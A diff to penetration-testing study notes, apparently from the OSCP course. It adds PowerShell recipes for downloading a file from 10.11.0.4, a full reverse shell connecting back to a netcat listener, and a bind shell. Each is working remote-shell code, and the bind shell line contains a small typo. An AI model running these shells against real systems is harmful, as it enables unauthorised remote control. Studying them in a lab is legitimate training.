@@ -48,11 +48,16 @@
     - [Remote Administration with Netcat](#Remote-Administration-with-Netcat)
         - [Netcat Bind Shell Scenario](#Netcat-Bind-Shell-Scenario)
         - [Reverse Shell Scenario](#Reverse-Shell-Scenario)
-        
+
     3.2. [socat](#socat)
     - [Transferring Files with Socat](#Transferring-Files-with-Socat)
     - [Socat Reverse Shells](#Socat-Reverse-Shells)
     - [Socat Encrypted Bind Shells](#Socat-Encrypted-Bind-Shells)
+
+    3.3. [PowerShell and Powercat](#PowerShell-and-Powercat)
+    - [PowerShell File Transfers](#PowerShell-File-Transfers)
+    - [PowerShell Reverse Shells](#PowerShell-Reverse-Shells)
+    - [PowerShell Bind Shells](#PowerShell-Bind-Shells)
 # Getting Comfortable with Kali Linux
 ## Finding Files in Kali Linux
 ### which 
@@ -377,6 +382,42 @@ kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXE
 #bind: use - to transfer data between STDIO and the remote host.
 C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
 ```
+## PowerShell and Powercat
+### PowerShell File Transfers
+```cmd
+C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+```
+Option **-c** - execute the supplied command (wrapped in double-quotes). "new-object" cndlet -  instantiate either a **.Net** Framework or a **COM** object. **WebClient** class - is defined and implemented in the **System.Net** namespace. WebClient exposes public method **DownloadFile**, which requires our two key parameters: a source location, and a target location.
+### PowerShell Reverse Shells
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+```
+```console
+#listener - 10.11.0.4
+kali@kali:~$ sudo nc -lnvp 443
+#target
+C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+### PowerShell Bind Shells
+```cmd
+#target
+C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Clos ();$listener.Stop()"
+#local
+kali@kali:~$ nc -nv 10.11.0.22 443
+```
+*System.Net.Sockets.TcpListener class, 0.0.0.0 - local address*
 
 
 
